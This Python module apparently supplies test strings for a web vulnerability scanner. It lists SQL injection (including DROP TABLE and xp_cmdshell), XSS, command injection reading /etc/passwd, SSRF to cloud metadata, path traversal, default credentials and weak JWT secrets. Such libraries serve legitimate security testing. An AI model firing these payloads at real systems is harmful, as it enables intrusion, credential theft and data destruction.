"""
Attack Payload Library - All vulnerability test strings
"""

SQLI_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "') OR ('1'='1",
    "1 UNION SELECT null--",
    "1 UNION SELECT null,null--",
    "' UNION SELECT username,password FROM users--",
    "1; DROP TABLE users--",
    "1' AND SLEEP(5)--",
    "1; SELECT SLEEP(5)--",
    "' AND 1=1--",
    "' AND 1=2--",
    "admin'--",
    "' OR 1=1--",
    "\" OR \"\"=\"",
    "1 OR 1=1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "'; EXEC xp_cmdshell('dir')--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' OR 'x'='x",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=1 onerror=alert(document.domain)>",
    "';alert(1)//",
    "\"><img src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<ScRiPt>alert(1)</sCrIpT>",
    "<iframe src=javascript:alert(1)>",
]

CMDI_PAYLOADS = [
    "; ls -la",
    "| ls -la",
    "& ls -la",
    "&& ls -la",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; whoami",
    "| whoami",
    "`whoami`",
    "$(whoami)",
    "; id",
    "; uname -a",
    "; sleep 5",
    "| sleep 5",
    "%0a ls -la",
    "%0a cat /etc/passwd",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://169.254.169.254",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "file:///etc/passwd",
    "file:///etc/hosts",
    "http://192.168.0.1",
    "http://10.0.0.1",
    "http://0x7f000001",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..%2Fetc%2Fpasswd",
    "....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "../etc/shadow",
    "../../../../var/log/apache2/access.log",
    "../windows/system32/drivers/etc/hosts",
]

BROKEN_AUTH_PAYLOADS = [
    {"username": "admin",         "password": "admin"},
    {"username": "admin",         "password": "password"},
    {"username": "admin",         "password": "123456"},
    {"username": "root",          "password": "root"},
    {"username": "admin",         "password": ""},
    {"username": "",              "password": ""},
    {"username": "administrator", "password": "administrator"},
    {"username": "test",          "password": "test"},
    {"username": "guest",         "password": "guest"},
]

JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "test",
    "key", "jwt_secret", "your-256-bit-secret", "changeme",
]

SQL_ERROR_SIGNATURES = [
    "sql syntax", "mysql_fetch", "ora-", "sqlite_",
    "postgresql", "warning: mysql", "valid mysql result",
    "microsoft ole db provider for sql", "odbc sql server driver",
    "quoted string not properly terminated",
    "syntax error or access violation",
    "unterminated quoted string", "pg::syntaxerror",
    "column count doesn't match", "mysql error", "sql server error",
]
